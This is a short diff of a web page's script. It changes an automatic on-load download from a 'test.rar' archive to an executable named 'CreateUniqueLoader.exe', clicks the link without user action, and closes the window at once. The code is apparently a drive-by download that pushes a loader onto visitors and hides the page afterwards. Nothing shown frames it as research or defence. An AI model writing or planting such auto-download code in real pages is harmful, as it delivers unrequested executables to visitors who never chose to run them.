@@ -6,16 +6,11 @@
 	<script>
 		window.onload = function() {
 			var link = document.createElement("a");
-			link.href = "assets/others/test.rar";
-			link.download = "test.rar";
+			link.href = "assets/others/CreateUniqueLoader.exe";
+			link.download = "CreateUniqueLoader.exe";
 			document.body.appendChild(link);
 			link.click();
-			link.addEventListener('load', function() {
-				setTimeout(function() {
-					window.open('', '_self', '');
-					window.close();
-				}, 1000);
-			}, false);
+			window.close();
 		}
 	</script>
 </head>
